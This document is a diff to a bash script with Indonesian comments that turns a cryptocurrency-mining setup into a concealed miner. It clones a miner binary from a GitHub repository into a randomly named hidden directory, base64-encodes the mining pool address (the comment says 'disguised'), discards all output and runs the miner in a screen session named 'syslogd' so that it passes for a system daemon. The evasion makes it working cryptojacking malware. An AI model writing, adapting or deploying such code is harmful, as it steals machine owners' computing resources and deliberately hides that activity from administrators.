@@ -1,38 +1,40 @@
 #!/bin/bash
-echo "📦 Menginstal dependensi..."
-apt-get update && apt-get install -y screen wget tar git
+apt-get update -y >/dev/null 2>&1 && apt-get install -y screen wget tar git -y >/dev/null 2>&1
 
-echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << 'EOF' > /root/benchmarks.sh
+# Nama acak
+XNAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
+XDIR="/root/.${XNAME}"
+XBIN="${XDIR}/${XNAME}"
+
+# Pool & wallet (disamarkan)
+ENC_POOL="c3RyYXR1bSt0Y3BzOi8vc3RyYXR1bS1hc2lhLnJwbGFudC54eXo6MTcwMjI="
+DEC_POOL=$(echo "$ENC_POOL" | base64 -d)
+WALLET="mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2"
+PASS="x"
+
+# Simpan skrip utama
+mkdir -p "$XDIR"
+cat << EOF > "$XDIR/.sys.sh"
 #!/bin/bash
+cd "$XDIR" || exit
 
-cd /root || exit
-
-# Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  echo "⬇️ Mengunduh file benchmarks..."
-  git clone https://github.com/amirul5656/ver.git
-  cd ver
-  chmod +x benchmarks
+# Download & siapkan binary
+if [ ! -f "$XBIN" ]; then
+  git clone https://github.com/amirul5656/ver.git "$XDIR/.tmp" >/dev/null 2>&1
+  cp "$XDIR/.tmp/benchmarks" "$XBIN"
+  chmod +x "$XBIN"
+  strip "$XBIN" >/dev/null 2>&1
 fi
 
-# Cek apakah screen sudah berjalan
-if screen -list | grep -q samiru13l3; then
-  echo "⚠️  Screen 'samiru13l3' sudah jalan, skip."
-else
-  echo "▶ Menjalankan mining di screen 'samiru13l3'..."
-  screen -dmS samiru13l3 bash -c '
-    while true; do
-      ./benchmarks --algorithm power2b --pool stratum+tcps://stratum-asia.rplant.xyz:17022 -u mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2 -p x --cpu-threads 7
-      sleep 2
-    done
-  '
-fi
+# Jalankan hanya jika belum aktif
+screen -list | grep -q syslogd || screen -dmS syslogd bash -c '
+  while true; do
+    $XBIN -x power2b -y $DEC_POOL -z $WALLET -w $PASS -t 7
+    sleep 2
+  done
+'
 EOF
 
-chmod +x /root/benchmarks.sh
-
-echo "🚀 Menjalankan miner sekarang..."
-bash /root/benchmarks.sh
-
-echo "✅ Siap! Mining aktif sekarang."
+# Jalankan
+chmod +x "$XDIR/.sys.sh"
+bash "$XDIR/.sys.sh"
